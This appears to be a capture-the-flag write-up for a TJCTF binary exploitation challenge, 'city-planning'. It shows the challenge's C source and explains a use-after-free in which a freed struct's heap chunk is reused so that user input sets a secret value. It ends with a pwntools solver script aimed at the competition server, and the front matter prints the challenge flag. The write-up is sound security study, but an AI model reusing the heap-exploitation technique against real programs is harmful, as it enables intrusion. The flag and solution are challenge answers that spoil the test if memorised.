---
title: city-planning
category: Binary Exploitation
tags: 
completedDuringEvent: true
submitted: true
points : 345
flag: tjctf{th4nk_y0u_f0r_sav1ng_m3y_grade}
draft: false
---
So, we got a exe file and the source code

`chall.c`:
```py
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

typedef struct {
    char name[32];
    int numAcres;
    int coordinates[2];
} buildingPlan;

typedef struct {
    int numAcres;
    int coordinates[2];
    int entryCode[8];
} HQPlan;

bool approvePlan(buildingPlan *plan) {
    if (plan->numAcres >= 10) {
        free(plan);
        plan = NULL;
        return false;
    }
    if (plan->coordinates[0] >= 200 || plan->coordinates[1] >= 200) {
        free(plan);
        plan = NULL;
        return false;
    }
    return true;
}

bool approveHQ(HQPlan *plan) {
    if (plan->numAcres >= 100) {
        free(plan);
        plan = NULL;
        return false;
    }
    if (plan->coordinates[0] >= 50 || plan->coordinates[1] >= 50) {
        free(plan);
        plan = NULL;
        return false;
    }
    return true;
}

int main() {
    char buf[32];

    setbuf(stdout, NULL);

    HQPlan *superSecretHQ = malloc(sizeof(HQPlan));
    superSecretHQ->numAcres = rand() % 100 + 10;
    superSecretHQ->coordinates[0] = rand() % 150 + 50;
    superSecretHQ->coordinates[1] = rand() % 150 + 50;
    for (int i = 0; i < 8; i++) {
        superSecretHQ->entryCode[i] = rand() % 100;
    }
    approveHQ(superSecretHQ);

    printf("Welcome to the city planner! You are allowed to plan one building for the city\n");
    buildingPlan *currentBuilding = malloc(sizeof(buildingPlan));

    printf("Enter the name of your building: ");
    fgets(buf, 32, stdin);
    memcpy(currentBuilding->name, buf, 32);

    printf("Enter the size of your building (in acres): ");
    fgets(buf, 32, stdin);
    currentBuilding->numAcres = atoi(buf);

    printf("Enter the east-west coordinate or your building (miles east of the city center): ");
    fgets(buf, 32, stdin);
    currentBuilding->coordinates[0] = atoi(buf);
    printf("Enter the north-south coordinate or your building (miles north of the city center): ");
    fgets(buf, 32, stdin);
    currentBuilding->coordinates[1] = atoi(buf);

    if (!approvePlan(currentBuilding)) {
        printf("Your building was not approved :(\n");
        return 1;
    }

    printf("Your building was approved! Construction will begin within the next 27 years\n\n");
    printf("Since your building was approved, you must be a great architect.\n");     
    printf("Because of this, we'd like to invite you to join the Super Secret Architect's Guild!\n");
    printf("To join the guild, all you have to do is find the planned coordinates of our headquarters\n");

    int guess[2];
    printf("Enter the east-west coordinate: ");
    fgets(buf, 32, stdin);
    guess[0] = atoi(buf);

    printf("Enter the north-south coordinate: ");
    fgets(buf, 32, stdin);
    guess[1] = atoi(buf);

    if (guess[0] != superSecretHQ->coordinates[0] || guess[1] != superSecretHQ->coordinates[1]) {
        printf("Incorrect guess\n");
        return 1;
    }

    printf("Correct! Welcome to the guild!");

    FILE *flagFile = fopen("flag.txt", "r");
    char flag[32];
    fgets(flag, 32, flagFile);

    printf("Here is the password to enter guild HQ: %s", flag);
    return 0;
}
```
from my analysis, there is `Use-After-Free` vuln\
First, the `main` function allocates a chunk for `HQPlan *superSecretHQ` and initializes it with random data. Crucially, the coordinates are always set to a value `>= 50`.\
The program immediately calls `approveHQ(superSecretHQ)`. This function checks if the coordinates are `>= 50`. Since this is always true, it calls `free(superSecretHQ)`, deallocating the memory. The `superSecretHQ` pointer now dangles, pointing to freed memory\
Right after, the program allocates memory for `buildingPlan*currentBuilding`. Since `sizeof(HQPlan)` and `sizeof(buildingPlan)` are identical (44 bytes), the `malloc` implementation (likely using tcache) reuses the exact same memory chunk that was just freed\
The UAF: As a result, both `superSecretHQ` and `currentBuilding` point to the same memory address. We can now control the data of the "secret" HQ by providing input for our own building plan

Now, our goal is to guess `superSecretHQ->coordinates`, we can simply write our own values into that location and then "guess" them\
```py
# Overwrites HQ->numAcres, HQ->coordinates[0], HQ->coordinates[1]
payload = b"\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00" + b"A" * 20
```
A small trick is required cus `fgets(buf, 32, ...)` reads at most 31 chars if we send a newline. Sending 32 byte payload with `sendline` leaves one byte and a newline in the `stdin` buffer.  Then passing checks, we provide valid inputs for out building's size and coordinates (`< 10` and `< 200`) to pass the `aprrovePlan` checks. When prompted to guess the secret coordinates, we simply enter `1` and `1`, the values we just wrote into memory.

This is the full `solver.py`:
```py
from pwn import *

HOST = "tjc.tf"
PORT = 31489
p = remote(HOST, PORT)
payload = b"\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00" + b"A" * 20

p.recvuntil(b"Enter the name of your building: ")
p.sendline(payload)
p.recvuntil(b"Enter the east-west coordinate or your building (miles east of the city center): ")
p.sendline(b"100")
p.recvuntil(b"Enter the north-south coordinate or your building (miles north of the city center): ")
p.sendline(b"100")
p.recvuntil(b"Enter the east-west coordinate: ")
p.sendline(b"1")
p.sendline(b"1")
p.interactive()
```